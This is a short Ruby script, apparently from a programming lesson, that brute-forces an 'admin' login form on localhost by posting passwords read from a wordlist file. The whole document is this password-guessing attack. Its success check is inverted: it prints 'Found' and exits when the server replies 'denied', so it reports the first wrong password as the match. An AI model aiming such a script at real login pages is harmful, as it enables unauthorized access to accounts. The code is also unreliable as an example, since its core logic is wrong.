require 'net/http'
require 'uri'

def is_wrong_password? password
uri = URI.parse "http://localhost:4567/"
response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
response.include? "denied"
end

input = File.open(__dir__ + "\\lesson18password.txt", "r")

while (line = input.gets)
  line.strip!
  print "Trying password #{line}..."
  if is_wrong_password? line
    puts "Found"
    input.close
    exit
  else
    puts "Error"
  end

end